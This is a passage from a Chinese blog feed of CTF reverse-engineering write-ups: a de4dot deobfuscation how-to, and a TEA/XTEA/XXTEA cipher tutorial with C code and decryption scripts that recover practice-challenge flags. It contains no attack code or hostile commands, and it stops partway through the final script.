(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,num[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>密钥：badbadwomen!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>在线解密</p><p><img src="/2021/03/28/Nepctf/1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;up_up_down_down_B_a_b_A_Nep_nep~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de4dot反混淆工具</title>
      <link href="2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/"/>
      <url>2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>找到下载好的文件所在的位置</p><a id="more"></a><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/1.png"></p><p>按住shift选择并右击，选择打开Powershell窗口</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/2.png"></p><p> 输入.\De4Dot [目标文件的路径]</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/4.png"></p><p>会生成一个名为：原文件名–cleaned.exe</p><p>去混淆前<br><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/5.png"></p><p>去混淆后</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喝茶吗</title>
      <link href="2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/"/>
      <url>2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h1 id="一个神奇的加密"><a href="#一个神奇的加密" class="headerlink" title="一个神奇的加密"></a>一个神奇的加密</h1><a id="more"></a><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019">参考链接</a></p><h3 id="tea加密"><a href="#tea加密" class="headerlink" title="tea加密"></a>tea加密</h3><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫·惠勒与罗杰·尼达姆。这项技术最初于1994年提交给鲁汶的快速软件加密的研讨会上，并在该研讨会上演讲中首次发表。</p><p>在给出的代码中：加密使用的数据为2个32位无符号整数，密钥为4个32位无符号整数即密钥长度为128位<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/1.png"><br>算法实现：</p><p>C语言代码（需支持C99）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, i;           &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i &lt; 32; i++) &#123;                       &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v0 +&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 +&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i&lt;32; i++) &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;1,2&#125;,k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1347371722 925494771<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.020 s<br>Press any key to continue.</p></blockquote><h3 id="xtea加密"><a href="#xtea加密" class="headerlink" title="xtea加密"></a>xtea加密</h3><p>XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/2.png"><br>算法实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] *&#x2F;</span><br><span class="line"> </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;0x9E3779B9;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">        v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;1,2&#125;;</span><br><span class="line">    uint32_t const k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int r&#x3D;32;&#x2F;&#x2F;num_rounds建议取值为32</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decipher(r, v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1345390024 2801624574<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.034 s<br>Press any key to continue.</p></blockquote><h3 id="xxtea加密"><a href="#xxtea加密" class="headerlink" title="xxtea加密"></a>xxtea加密</h3><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版 ，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/3.png"><br>算法实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#define DELTA 0x9e3779b9</span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><span class="line"> </span><br><span class="line">void btea(uint32_t *v, int n, uint32_t const key[4])</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t y, z, sum;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    if (n &gt; 1)            &#x2F;* Coding Part *&#x2F;</span><br><span class="line">    &#123;</span><br><span class="line">        rounds &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        sum &#x3D; 0;</span><br><span class="line">        z &#x3D; v[n-1];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            sum +&#x3D; DELTA;</span><br><span class="line">            e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y &#x3D; v[p+1];</span><br><span class="line">                z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">            z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">        &#125;</span><br><span class="line">        while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (n &lt; -1)      &#x2F;* Decoding Part *&#x2F;</span><br><span class="line">    &#123;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">        rounds &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        sum &#x3D; rounds*DELTA;</span><br><span class="line">        y &#x3D; v[0];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z &#x3D; v[p-1];</span><br><span class="line">                y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z &#x3D; v[n-1];</span><br><span class="line">            y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">            sum -&#x3D; DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D; &#123;1,2&#125;;</span><br><span class="line">    uint32_t const k[4]&#x3D; &#123;2,2,3,4&#125;;</span><br><span class="line">    int n&#x3D; 2; &#x2F;&#x2F;n的绝对值表示v的长度，取正表示加密，取负表示解密</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：3238569099 2059193138<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.369 s<br>Press any key to continue.</p></blockquote><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p><a href="https://pan.baidu.com/s/1jZogTyTC3aKMmBO9DyaEgg">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k, int n)</span><br><span class="line">&#123;</span><br><span class="line">int j;</span><br><span class="line">    for(j&#x3D;0;j&lt;n;j+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        uint32_t v0&#x3D;v[j], v1&#x3D;v[j+1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">        uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">        uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">        for (i&#x3D;0; i&lt;32; i++)</span><br><span class="line">        &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">            v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">            sum -&#x3D; delta;</span><br><span class="line">        &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">        v[j]&#x3D;v0; v[j+1]&#x3D;v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int </span><br><span class="line">data[24]&#x3D;&#123;0xdd970cc4,0x818d6166,0xb47035f4,0xd099de74,0xb50c0b58,0x2cecb013,0x20ca556f,0x35301e68,0x457b62b2,0x91926c85,0xe15a695a,0x2e550212,0xdd0426e,0x839dc37,0xba150ea0,0x2aad9fd7,0x6889d7e2,0x82f201d7,0x3374d877,0x2e17ed88,0x35196e88,0x236ab4b9,0x75c5e88,0xdb68bf4b&#125;;</span><br><span class="line">int i;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">int n&#x3D;24;</span><br><span class="line">decrypt(data, k,n);</span><br><span class="line">for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{YOU_FIND_THE_FLAG!}</p></blockquote><h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p><a href="https://pan.baidu.com/s/1bAgbw0TAJMC_5uWO_UwqIQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void decipher(uint32_t v[2], uint32_t const key[4], int n)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    int num_rounds&#x3D;32;</span><br><span class="line">    int j;</span><br><span class="line">    for(j&#x3D;0;j&lt;n;j+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        uint32_t v0&#x3D;v[j], v1&#x3D;v[j+1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;</span><br><span class="line">        for (i&#x3D;0; i &lt; num_rounds; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">            sum -&#x3D; delta;</span><br><span class="line">            v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        &#125;</span><br><span class="line">        v[j]&#x3D;v0; v[j+1]&#x3D;v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int data[26]&#x3D;&#123;0x27275d99,0x3c11048b,0x467297e3,0xc09af6b8,0xed74946a,0x2f994350,0xf045f43e,0x81b107b8,0x899a9e3,0x2bc3d1b6,0x6f738cdb,0xfd9b7c7c,0xe52275fe,0x21586050,0x6bd3d095,0xc1edbe2f,0x6f1f00b1,0x1613f009,0x6109db9,0xfef136d2,0x98dd74f9,0x750a3393,0xb93cc79c,0x35df2918,0xba1f4f1c,0x5936c0c8&#125;;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">int n&#x3D;26;</span><br><span class="line">decipher(data, k, n);</span><br><span class="line">for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{luoyu-1224.github.io}</p></blockquote><h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p><a href="https://pan.baidu.com/s/1Kd_G9dwbLA7vP5yolYECaA">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span><br><span class="line"></span><br><span class="line">int check[26]&#x3D;&#123;0xecc7f567,0xecc3d63f,0xfd046ee,0x4231e0b8,0x2aa73061,0x376a03f2,0xef400f49,0x78b22f96,0x3c80565a,0x53cf31ae,0x1bf54a05,0x43ac56f8,0xeb92b3fd,0xd4abe89b,0xfd3b88db,0x6c65b706,0xbe48072b,0x3e445861,0x247e6144,0x79b5a5af,0x3e42487b,0x2ac44245,0x15e908f0,0x120e8173,0x69fea947,0x70917ef7&#125;;</span><br><span class="line"></span><br><span class="line">int btea(int* v, int n, unsigned int k[4])       </span><br><span class="line">&#123;</span><br><span class="line">    unsigned int z&#x3D;v[n-1], y&#x3D;v[0], sum&#x3D;0, e, DELTA&#x3D;0x9e3779b9;</span><br><span class="line">int p, q ;</span><br><span class="line">    if (n &gt; 1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 加密过程 *&#x2F;</span><br><span class="line">        q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        while (q-- &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">    sum +&#x3D; DELTA;</span><br><span class="line">e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">&#123;</span><br><span class="line">y &#x3D; v[p+1];</span><br><span class="line">z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">        return 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">else if (n &lt; -1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 解密过程 *&#x2F;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">q 